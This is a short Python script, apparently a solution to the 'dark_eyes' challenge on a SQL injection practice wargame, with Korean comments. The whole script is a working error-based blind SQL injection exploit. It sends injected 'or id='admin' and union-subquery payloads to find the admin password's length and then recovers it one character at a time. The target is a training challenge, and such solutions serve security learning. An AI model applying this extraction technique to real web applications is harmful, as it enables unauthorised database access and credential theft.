import requests
from settings import session_id


# 기본 설정
url = "https://los.rubiya.kr/chall/dark_eyes_4e0c557b6751028de2e64d4d0020e02c.php"
cookies = {'PHPSESSID': session_id}


# 비밀번호 길이를 구하는 함수:
# - 1부터 50까지 테스트
def find_pw_length():
    for i in range(1, 50):
        payload = "?pw=%27or%20id='admin' and (select 1 union select 2 where !(length(pw)=" + str(i) + "))%23"
        res = requests.get(url + payload, cookies=cookies)
        # 쿼리가 통과해 query: 텍스트를 포함하면 통과
        if "query" in res.text:
            return i
    return


# 구한 비밀번호 길이 값을 가지고 비밀번호를 구하는 함수:
# - 각 자리마다 확인
def find_pw(length):
    pw = str()
    for i in range(1, length + 1):
        for j in range(32, 127):
            payload = f"?pw=%27or id='admin' and (select 1 union select 2 where !(ord(substr(pw,{i},1))={j}))%23"
            res = requests.get(url + payload, cookies=cookies)
            # 쿼리가 통과해 query: 텍스트를 포함하면 통과
            if 'query' in (res.text):
                char = chr(j)
                pw += char
                print(char)
                break
    return pw


pw_length = find_pw_length()
print(f"Password length: {pw_length}")
pw = find_pw(pw_length)
print(f"Password: {pw}")
